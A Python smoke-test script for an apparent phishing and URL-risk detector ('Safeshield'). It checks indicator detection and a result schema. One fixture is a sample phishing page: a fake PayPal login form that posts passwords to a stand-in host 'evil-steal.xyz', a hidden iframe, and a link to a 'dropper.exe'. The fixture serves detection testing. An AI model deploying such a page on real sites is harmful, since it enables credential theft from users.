import sys
sys.path.insert(0, r'C:\GitHub\Safeshield\url_checker')
sys.path.insert(0, r'C:\GitHub\Safeshield\backend')

# 1. live_inspector imports
from analyzer.live_inspector import fetch_page, MALICIOUS_EXTENSIONS, MALICIOUS_CONTENT_TYPES, FETCH_TIMEOUT
print(f'[OK] live_inspector: timeout={FETCH_TIMEOUT}s, {len(MALICIOUS_EXTENSIONS)} exe-exts, {len(MALICIOUS_CONTENT_TYPES)} bad content-types')

# 2. inspect_html_content — credential harvesting, hidden iframe, drive-by
from dataset.utils.url_rules import inspect_html_content
from dataset.utils.url_normalize import normalize_url

html_phish = (
    '<html><head><title>PayPal Secure Login</title></head><body>'
    '<form action="https://evil-steal.xyz/steal"><input type="password" name="pw"/></form>'
    '<iframe style="width:0;height:0;" src="http://tracker.evil.xyz"></iframe>'
    '<a href="/payload/dropper.exe">Download update</a>'
    '</body></html>'
)
info = normalize_url('http://notpaypal.xyz/login')
reasons, indicators, penalty, force_fraud = inspect_html_content(html_phish, info)
print(f'[OK] phish indicators: {indicators}  penalty={round(penalty,2)}  force_fraud={force_fraud}')
assert 'credential_harvesting' in indicators, f'FAIL credential_harvesting not in {indicators}'
assert 'hidden_iframe' in indicators, f'FAIL hidden_iframe not in {indicators}'
assert 'drive_by_download_risk' in indicators, f'FAIL drive_by not in {indicators}'
assert force_fraud is True

# 3. brand_title_mismatch on a domain with no brand substring
html_brand = '<html><head><title>PayPal Login</title></head><body></body></html>'
_, ind_b, _, _ = inspect_html_content(html_brand, normalize_url('http://secure-verify-now.xyz/signin'))
assert 'brand_title_mismatch' in ind_b, f'FAIL brand_title_mismatch not detected, got {ind_b}'
print('[OK] brand_title_mismatch detected correctly')

# 4. Benign HTML produces no indicators
_, ind_ok, pen_ok, ff_ok = inspect_html_content(
    '<html><head><title>My Blog</title></head><body><p>Hello!</p></body></html>',
    normalize_url('https://myblog.com/')
)
assert ind_ok == [] and ff_ok is False, f'FAIL benign produced {ind_ok}'
print('[OK] benign HTML has no false positives')

# 5. URLRiskAnalysis schema has all 13 required fields
from analyzer.url_analyzer import analyze_url, URLRiskAnalysis
from dataclasses import fields
required = {'normalized_url','risk_score','risk_level','category','verdict','confidence',
            'reasons','detected_indicators','recommendation','model_prediction',
            'model_confidence','rule_confidence','domain_valid'}
actual = {f.name for f in fields(URLRiskAnalysis)}
missing = required - actual
assert not missing, f'FAIL Schema missing: {missing}'
print(f'[OK] URLRiskAnalysis schema intact ({len(actual)} fields)')

print()
print('=== All smoke tests passed ===')
